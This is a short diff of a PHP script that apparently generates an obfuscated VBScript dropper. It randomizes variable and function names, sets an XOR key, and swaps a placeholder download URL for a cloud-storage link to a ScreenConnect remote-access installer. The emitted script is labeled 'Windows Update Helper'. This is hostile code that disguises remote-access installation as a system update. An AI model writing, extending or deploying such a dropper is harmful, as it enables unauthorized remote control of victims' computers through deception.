@@ -23,7 +23,7 @@ $randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
 $randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
 $xorKey    = rand(100, 255);
 
-$scUrl = "https://yourdomain.com/ScreenConnect.ClientSetup.exe";   // CHANGE THIS
+$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";   // CHANGE THIS
 
 echo <<<VBS
 ' Windows Update Helper
